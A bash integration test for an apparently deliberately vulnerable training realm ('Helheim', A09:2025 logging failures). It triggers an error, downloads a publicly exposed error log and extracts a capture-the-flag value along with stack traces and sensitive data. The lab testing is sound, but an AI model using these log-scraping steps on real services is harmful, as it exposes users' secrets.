#!/bin/bash
#
# Helheim Realm Integration Test
# Tests the A09:2025 Logging & Alerting Failures vulnerability
#

set -e

echo "🧪 Testing Helheim Realm (A09:2025 - Logging & Alerting Failures)"
echo "=================================================================="

GATEKEEPER_URL="${GATEKEEPER_URL:-http://localhost:8080}"
REALM_PATH="/realms/helheim"
USER_ID="helheim-test-$(date +%s)"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

TESTS_PASSED=0
TESTS_FAILED=0

assert_contains() {
  local haystack="$1"
  local needle="$2"
  local description="$3"
  
  if echo "$haystack" | grep -q "$needle"; then
    echo -e "${GREEN}✓${NC} $description"
    ((TESTS_PASSED++))
  else
    echo -e "${RED}✗${NC} $description"
    ((TESTS_FAILED++))
  fi
}

echo ""
echo "Step 1: Verify realm is accessible"
echo "-----------------------------------"

HEALTH_RESPONSE=$(curl -s "$GATEKEEPER_URL$REALM_PATH/health")
assert_contains "$HEALTH_RESPONSE" "helheim" "Health check returns helheim realm"

echo ""
echo "Step 2: Trigger error to generate log"
echo "--------------------------------------"

ERROR_RESPONSE=$(curl -s -X POST "$GATEKEEPER_URL$REALM_PATH/api/memorial" \
  -H "Content-Type: application/json" \
  -d '{}')

assert_contains "$ERROR_RESPONSE" "Validation failed" "Error response received"
echo "Waiting for log file to be written..."
sleep 1

echo ""
echo "Step 3: Access publicly exposed log files"
echo "------------------------------------------"

LOG_RESPONSE=$(curl -s "$GATEKEEPER_URL$REALM_PATH/temp_logs/error.log")

if [ -z "$LOG_RESPONSE" ]; then
  echo -e "${RED}✗${NC} Log file not accessible or empty"
  ((TESTS_FAILED++))
else
  echo -e "${GREEN}✓${NC} Log file is publicly accessible"
  ((TESTS_PASSED++))
fi

echo ""
echo "Step 4: Extract flag from log file"
echo "-----------------------------------"

assert_contains "$LOG_RESPONSE" "YGGDRASIL{" "Log contains flag"
assert_contains "$LOG_RESPONSE" "HELHEIM" "Log contains HELHEIM realm name"
assert_contains "$LOG_RESPONSE" "Stack Trace" "Log contains stack trace"
assert_contains "$LOG_RESPONSE" "SENSITIVE DATA" "Log contains sensitive data section"

FLAG=$(echo "$LOG_RESPONSE" | grep -oP 'YGGDRASIL\{[^}]+\}' | head -1)

if [ -z "$FLAG" ]; then
  echo -e "${RED}✗${NC} Failed to extract flag"
  ((TESTS_FAILED++))
  exit 1
else
  echo -e "${GREEN}✓${NC} Flag extracted: $FLAG"
  ((TESTS_PASSED++))
fi

echo ""
echo "Step 5: Validate flag format"
echo "-----------------------------"

if echo "$FLAG" | grep -qP '^YGGDRASIL\{HELHEIM:[a-f0-9-]+\}$'; then
  echo -e "${GREEN}✓${NC} Flag format valid"
  ((TESTS_PASSED++))
else
  echo -e "${RED}✗${NC} Invalid flag format: $FLAG"
  ((TESTS_FAILED++))
fi

echo ""
echo "Step 6: Verify no monitoring/alerting"
echo "--------------------------------------"

STATUS_RESPONSE=$(curl -s "$GATEKEEPER_URL$REALM_PATH/api/system-status")
assert_contains "$STATUS_RESPONSE" "operational" "System status shows operational"
assert_contains "$STATUS_RESPONSE" "monitoring" "Fake monitoring claimed"

echo ""
echo "Step 7: Test valid memorial submission"
echo "---------------------------------------"

VALID_RESPONSE=$(curl -s -X POST "$GATEKEEPER_URL$REALM_PATH/api/memorial" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","message":"Test memorial"}')

assert_contains "$VALID_RESPONSE" "success" "Valid submission works"

echo ""
echo "=================================================================="
echo "Test Summary"
echo "=================================================================="
echo -e "Tests Passed: ${GREEN}$TESTS_PASSED${NC}"
echo -e "Tests Failed: ${RED}$TESTS_FAILED${NC}"
echo ""

if [ $TESTS_FAILED -eq 0 ]; then
  echo -e "${GREEN}✅ All Helheim tests PASSED${NC}"
  echo ""
  echo "Flag captured: $FLAG"
  exit 0
else
  echo -e "${RED}❌ Some tests FAILED${NC}"
  exit 1
fi
